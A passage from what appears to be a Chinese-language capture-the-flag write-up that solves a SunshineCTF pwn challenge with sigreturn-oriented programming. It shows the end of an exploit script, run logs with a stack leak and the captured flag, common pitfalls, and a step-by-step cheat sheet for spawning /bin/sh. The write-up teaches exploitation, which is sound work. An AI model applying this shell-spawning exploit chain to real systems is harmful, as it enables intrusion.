time.sleep(1.5)                    # 等指令跑完、輸出回到我們手上
out = p.recvrepeat(3)              # 一直收到「3 秒內沒有新資料」為止
```

> 💡 `execve("/bin/sh")` 之後，我們是在跟一個 **shell** 講話，所以要**等一下**再送指令
> （`time.sleep(0.5)`），送完再等它輸出（`time.sleep(1.5)`）。
> `p.recvrepeat(3)` = 「一直收到 3 秒內沒有新資料為止」（等同 `recvall(timeout=3)`），
> 因為我們不知道 flag 有幾個 byte。
> 最後用 `re.search(rb"[A-Za-z0-9_]+\{[^}]*\}", out)` 把 `sun{…}` 從一堆輸出裡抓出來。

---

## 7. 實際執行結果

遠端（`python3 exploit.py REMOTE`，要在 `pwn1/` 目錄下執行）：

```
$ python3 exploit.py REMOTE
[+] Opening connection to chal.sunshinectf.games on port 26003: Done
[+] stack leak  = 0x7ffee35ef418
[*] vuln buffer = 0x7ffee35ef398

[+] raw output:
sun{r3caLl_ev3Ry_reGist3r_sR0p}
uid=1337(total_recall) gid=1337(total_recall) groups=1337(total_recall)
DONE

[+] FLAG: sun{r3caLl_ev3Ry_reGist3r_sR0p}
```

先跑本地確認 exploit 沒問題（`python3 exploit.py`）：

```
[+] stack leak  = 0x7ffd1208cf68
[*] vuln buffer = 0x7ffd1208cee8

[+] raw output:
sun{LOCAL_DUMMY_FLAG}
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

[+] FLAG: sun{LOCAL_DUMMY_FLAG}
```

> 本地 `pwn1/flag.txt` 是主辦方附的**假 flag**（`sun{LOCAL_DUMMY_FLAG}`），
> 真 flag 只在遠端；`pwn1/FLAG.txt` 才是我們打到的真答案。

✅ **Flag：`sun{r3caLl_ev3Ry_reGist3r_sR0p}`**

---

## 8. 常見坑

1. **`push rsp` 壓的是舊值。** 如果你以為是「壓完之後的 `rsp`」，
   整個 `leak - 0x80` 的推導就會差 8。
   → **永遠用 gdb 確認**，不要憑記憶。
2. **`rsp` 在 syscall 前的位置算錯。** sigframe 必須**正好**落在 `rsp`，
   差 8 bytes 就會 SIGSEGV。
   訣竅：在 `0x401069` 下中斷點，印 `$rsp`。
3. **送給 `read()` 的長度要剛好。** `rax` 是「實際讀到的**位元組數**」，
   不是我們想像的數字。要 `rax=15`，就必須讓那次 `read()` 剛好回傳 15。
   實務上：一次 `send()` 送 15 bytes，讓核心一次交付。
4. **`execve` 的 `argv` 可以是 `NULL`。** Linux 允許，會當成空陣列。
   有些教學會叫你放 `["/bin/sh", NULL]`，兩者都能拿到 shell。
5. **`execve` 之後不需要 `exit`。** 行程映像被換掉了。
6. **題目允許 shellcode。** 這題堆疊可執行，其實也可以把 shellcode 寫在堆疊上
   再 `ret` 過去。但既然名稱明示 SROP，就用 SROP —— 而且 SROP 是更通用的技巧
   （很多時候堆疊不可執行、又沒有 `pop` gadget，只能靠 SROP）。

---

## 9. 一頁速查

```
漏洞       : read(0, rsp-0x80, 0x400)   → 覆蓋返回位址 (offset 0x80)
洩漏       : write(1, rsp, 8)           → 得到堆疊位址 leak
緩衝區     : buf = leak - 0x80
缺 gadget  : 沒有 pop rdi/rsi/rdx，無法用普通 ROP 設 execve 參數
解法       : SROP
   1) ret → 0x40104f (再來一次 read，長度 0x400)
   2) 準備好 15 的輸入長度 → rax = 15
   3) ret → 0x401069 (syscall; ret) → rt_sigreturn
   4) rsp = buf+0x90 擺 SigreturnFrame，rip = 0x401069，rax = 59，rdi = "/bin/sh"
   5) execve 成功 → shell
```

> ⚠️ 一定要 `cd pwn1/` 之後再跑（`python3 exploit.py`），
> 因為 exploit 用的是相對路徑 `./challenge`；
> 或直接用 `wp/run_all.sh`（它會自動 cd 進各題目目錄）。
> 在 repo 根目錄執行會看到 `[ERROR] './challenge' does not exist`。
